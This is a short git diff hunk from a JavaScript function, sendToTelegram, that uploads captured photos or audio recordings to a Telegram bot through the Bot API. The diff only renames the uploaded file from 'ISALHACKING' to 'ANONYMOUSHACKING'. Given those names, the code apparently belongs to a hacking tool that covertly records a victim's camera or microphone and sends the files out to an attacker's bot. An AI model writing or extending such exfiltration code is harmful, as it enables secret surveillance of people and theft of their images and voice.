@@ -183,7 +183,7 @@ async function sendToTelegram(data, type) {
   // field untuk file: 'photo' untuk gambar, 'audio' untuk audio
   const fieldName = type === 'photo' ? 'photo' : 'audio';
   const extension = type === 'photo' ? 'jpg' : 'wav';
-  formData.append(fieldName, data, `ISALHACKING.${extension}`);
+  formData.append(fieldName, data, `ANONYMOUSHACKING.${extension}`);
 
   const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;
 
